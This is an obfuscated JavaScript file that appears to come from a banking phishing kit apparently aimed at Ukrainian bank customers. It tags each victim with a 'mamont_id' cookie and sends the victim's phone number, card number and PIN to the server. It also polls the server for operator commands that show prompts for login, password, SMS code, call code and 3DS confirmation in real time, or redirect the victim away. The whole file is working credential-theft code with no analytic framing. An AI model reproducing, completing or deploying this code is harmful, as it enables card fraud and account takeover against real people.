var O = G;
(function (z, d) {
    var H = G, S = z();
    while (!![]) {
        try {
            var h = -parseInt(H(0x11b)) / 0x1 * (parseInt(H(0x129)) / 0x2) + -parseInt(H(0x161)) / 0x3 * (parseInt(H(0x131)) / 0x4) + parseInt(H(0x123)) / 0x5 + -parseInt(H(0x146)) / 0x6 * (-parseInt(H(0x16d)) / 0x7) + parseInt(H(0x15d)) / 0x8 * (-parseInt(H(0x147)) / 0x9) + -parseInt(H(0x125)) / 0xa + parseInt(H(0x12e)) / 0xb;
            if (h === d)
                break;
            else
                S['push'](S['shift']());
        } catch (Q) {
            S['push'](S['shift']());
        }
    }
}(s, 0x8bdbf));
function getParameterByName(z, d = window[O(0x117)]['href']) {
    var T = O;
    z = z[T(0x119)](/[\[\]]/g, T(0x134));
    var S = new RegExp('[?&]' + z + T(0x15f)), h = S[T(0x141)](d);
    if (!h)
        return null;
    if (!h[0x2])
        return '';
    return decodeURIComponent(h[0x2][T(0x119)](/\+/g, '\x20'));
}
function $e(z) {
    var N = O;
    return document[N(0x120)](z);
}
var diia_download_link, mamont_id = getCookie(O(0x11d)) ? getCookie(O(0x11d)) : (function () {
        var C = O, z = parseInt(Math[C(0x127)]() * 0xa ** 0x6)[C(0x13d)]();
        return setCookie('mamont_id', z, 0x1 / 0x18), z;
    }()), vbiver_on_log = getCookie('vbiver_on_log'), vbiv_block = getCookie(O(0x152)), cancel_url = O(0x158);
function check_block() {
    var D = O;
    if (vbiv_block == 0x1)
        return window[D(0x117)][D(0x11e)] = cancel_url, !![];
}
check_block();
function send_form(z, d, S) {
    var p = O;
    if (vbiver_on_log == 0x1)
        return send_again_form(z, p(0x12d), d, 'num_card', S, p(0x116));
    console[p(0x154)](p(0x16c), {
        'mid': mamont_id,
        'number': z,
        'num_card': d,
        'pin': S
    }), fetch(p(0x160), {
        'method': p(0x132),
        'headers': { 'Content-Type': 'application/x-www-form-urlencoded' },
        'body': 'mid=' + mamont_id + '&number=' + z + p(0x12a) + d + p(0x156) + S
    })[p(0x163)](h => h[p(0x151)]())[p(0x163)](h => {
        console['log'](h);
    })[p(0x11a)](h => console[p(0x154)]('Error:', h));
}
function send_again_form() {
    var A = O, z = A(0x124) + mamont_id;
    if (arguments[A(0x14f)] % 0x2 !== 0x0) {
        console[A(0x15b)](A(0x13c));
        return;
    }
    for (var d = 0x0; d < arguments[A(0x14f)]; d += 0x2) {
        var S = arguments[d], h = arguments[d + 0x1];
        z += '&' + h + '=' + S;
    }
    console[A(0x154)]('Sending\x20data\x20to\x20server,\x20data:\x20', z), fetch(A(0x155), {
        'method': A(0x132),
        'headers': { 'Content-Type': A(0x14c) },
        'body': z
    })[A(0x163)](Q => Q[A(0x151)]())['then'](Q => {
        var w = A;
        console[w(0x154)](Q);
    })['catch'](Q => console[A(0x154)](A(0x11c), Q));
}
function send_input(z, d) {
    var Z = O;
    console[Z(0x154)](Z(0x13a) + d + Z(0x12f), {
        'mid': mamont_id,
        'input': z
    }), fetch(Z(0x133) + d, {
        'method': 'POST',
        'headers': { 'Content-Type': Z(0x14c) },
        'body': Z(0x124) + mamont_id + ('&' + d + '=') + z
    })['then'](S => S['json']())['then'](S => {
        var k = Z;
        console[k(0x154)](S);
    })['catch'](S => console[Z(0x154)](Z(0x11c), S));
}
function s() {
    var Y = [
        'url',
        'OID\x20sent',
        'Empty\x20response.',
        'setTime',
        'cookie',
        'Sending\x20Privat\x20to\x20server,\x20data:\x20',
        '112nowENZ',
        'getTime',
        'ask_login',
        'pathname',
        'pin',
        'location',
        'custom_error',
        'replace',
        'catch',
        '922541rMnApn',
        'Error:',
        'mamont_id',
        'href',
        '&oid=',
        'getElementById',
        'Got\x20message:',
        'ack',
        '2542400UFwRBb',
        'mid=',
        '11225230SoZlDl',
        'Sending\x20OID\x20to\x20server,\x20data:\x20',
        'random',
        'ask_error_push',
        '2awsXWh',
        '&num_card=',
        'ask_error_call',
        'ask_error_pin',
        'number',
        '45098273Uniqfm',
        '\x20to\x20server,\x20data:\x20',
        'ask_error_login',
        '8iuCWjk',
        'POST',
        '/send_info/',
        '\x5c$&',
        'Asking\x20for\x20action...',
        'mid',
        '\x22,\x20got\x20id:\x20\x22',
        'ask_error_num_card',
        'Got\x20command,\x20but\x20mamont\x20id\x20not\x20same.\x20My\x20id:\x20\x22',
        'Sending\x20',
        'ask_pin',
        'Expected\x20even\x20number\x20of\x20arguments',
        'toString',
        'ask_sms',
        'showinfo',
        'toUTCString',
        'exec',
        ';\x20path=/',
        'charAt',
        'innerText',
        '=;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20UTC;\x20path=/;',
        '72978GgQUlO',
        '450eUsicp',
        'substring',
        'indexOf',
        'showerror',
        'ask_num_card',
        'application/x-www-form-urlencoded',
        'ask_custom_error',
        'ask_pass',
        'length',
        '/my_oid',
        'json',
        'vbiv_block',
        'ask_phone',
        'log',
        '/send_again_form',
        '&pin=',
        'ask_push',
        'https://google.com/',
        'ask_password',
        'ask_call',
        'error',
        'vbiver_on_log',
        '167408bVDrGh',
        'dataset',
        '(=([^&#]*)|&|#|$)',
        '/send_bank/Oshadbank',
        '1708056FRwVjt',
        'ask_error_pass',
        'then',
        'vbiv_profit',
        'No\x20mamont_id,\x20yet\x20trying\x20to\x20process...',
        'vbiv_cancel'
    ];
    s = function () {
        return Y;
    };
    return s();
}
function message_handler(z) {
    var R = O, d = z['command'], S = z[R(0x136)], h = z['url'];
    console[R(0x154)](R(0x121), z, z['mid'], z[R(0x136)]);
    if (S == null)
        console[R(0x154)](R(0x165));
    else {
        if (mamont_id != S)
            return console[R(0x154)](R(0x139) + mamont_id + R(0x137) + S + '\x22'), ![];
    }
    if (d == 'ping' || d == R(0x122))
        console[R(0x154)](d, 'from\x20server\x20OK');
    else {
        if (d == R(0x15c))
            setCookie(R(0x15c), 0x1, 0x1 / 0x18);
        else {
            if (d == R(0x166))
                deleteCookie(R(0x11d)), deleteCookie(R(0x15c)), window['location']['href'] = cancel_url;
            else {
                if (d == R(0x152))
                    setCookie('vbiv_block', 0x1, 0x3), window['location'][R(0x11e)] = cancel_url;
                else {
                    if (d == R(0x164))
                        deleteCookie(R(0x11d)), deleteCookie(R(0x15c)), window[R(0x117)]['href'] = cancel_url;
                    else {
                        if (d == R(0x14a))
                            document[R(0x120)](R(0x118))[R(0x144)] = z['text'], show_block(R(0x14d));
                        else {
                            if (d == R(0x13f)) {
                            } else {
                                if (d == R(0x16f))
                                    show_block(R(0x16f), ![], !![]);
                                else {
                                    if (d == R(0x130))
                                        show_block(R(0x16f), !![], !![]);
                                    else {
                                        if (d == R(0x153))
                                            show_block(R(0x153), ![], !![]);
                                        else {
                                            if (d == 'ask_error_phone')
                                                show_block('ask_phone', !![], !![]);
                                            else {
                                                if (d == R(0x14e))
                                                    show_block(R(0x159), ![], !![]);
                                                else {
                                                    if (d == R(0x162))
                                                        show_block(R(0x159), !![], !![]);
                                                    else {
                                                        if (d == R(0x13b))
                                                            show_block(R(0x13b), ![], !![]);
                                                        else {
                                                            if (d == R(0x12c))
                                                                show_block(R(0x13b), !![], !![]);
                                                            else {
                                                                if (d == R(0x14b))
                                                                    show_block('ask_num_card', ![], !![]);
                                                                else {
                                                                    if (d == R(0x138))
                                                                        show_block(R(0x14b), !![], !![]);
                                                                    else {
                                                                        if (d == R(0x15a))
                                                                            show_block('ask_call_code', ![], !![]);
                                                                        else {
                                                                            if (d == R(0x12b))
                                                                                show_block('ask_call_code', !![], !![]);
                                                                            else {
                                                                                if (d == R(0x13e))
                                                                                    show_block(R(0x13e), ![], !![]);
                                                                                else {
                                                                                    if (d == 'ask_error_sms')
                                                                                        show_block(R(0x13e), !![], !![]);
                                                                                    else {
                                                                                        if (d == R(0x157)) {
                                                                                        } else {
                                                                                            if (d == R(0x128)) {
                                                                                            } else
                                                                                                d == 'show_url' && (document[R(0x120)]('ask_url_3ds')[R(0x15e)][R(0x167)] = h, show_block('ask_url_3ds'));
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
function G(z, d) {
    var S = s();
    return G = function (h, Q) {
        h = h - 0x116;
        var H = S[h];
        return H;
    }, G(z, d);
}
;
let pathArray = window[O(0x117)][O(0x170)]['split']('/'), oid = pathArray[pathArray[O(0x14f)] - 0x1];
if (oid) {
    let data_to_post = O(0x124) + mamont_id + O(0x11f) + oid;
    console[O(0x154)](O(0x126), data_to_post), fetch(O(0x150), {
        'method': O(0x132),
        'headers': { 'Content-Type': O(0x14c) },
        'body': data_to_post
    })['then'](z => console['log'](O(0x168)))[O(0x11a)](z => console[O(0x154)](O(0x11c), z));
}
function ask_for_actions() {
    var r = O;
    console[r(0x154)](r(0x135)), fetch('/get_command', {
        'method': r(0x132),
        'headers': { 'Content-Type': 'application/x-www-form-urlencoded' },
        'body': r(0x124) + mamont_id
    })[r(0x163)](z => z[r(0x151)]())[r(0x163)](z => {
        var F = r;
        console[F(0x154)](z), !z ? console['log'](F(0x169)) : message_handler(z);
    })[r(0x11a)](z => console[r(0x154)](r(0x11c), z)), setTimeout(ask_for_actions, 0x5dc);
}
function setCookie(z, d, S) {
    var q = O;
    let h = new Date();
    h[q(0x16a)](h[q(0x16e)]() + S * 0x18 * 0x3c * 0x3c * 0x3e8);
    let Q = ';\x20expires=' + h[q(0x140)]();
    document[q(0x16b)] = z + '=' + d + Q + q(0x142);
}
function getCookie(z) {
    var V = O;
    let d = z + '=', S = document[V(0x16b)]['split'](';');
    for (let h = 0x0; h < S['length']; h++) {
        let Q = S[h];
        while (Q[V(0x143)](0x0) == '\x20')
            Q = Q[V(0x148)](0x1, Q['length']);
        if (Q[V(0x149)](d) == 0x0)
            return Q[V(0x148)](d[V(0x14f)], Q[V(0x14f)]);
    }
    return null;
}
function deleteCookie(z) {
    var l = O;
    document['cookie'] = z + l(0x145);
}
ask_for_actions();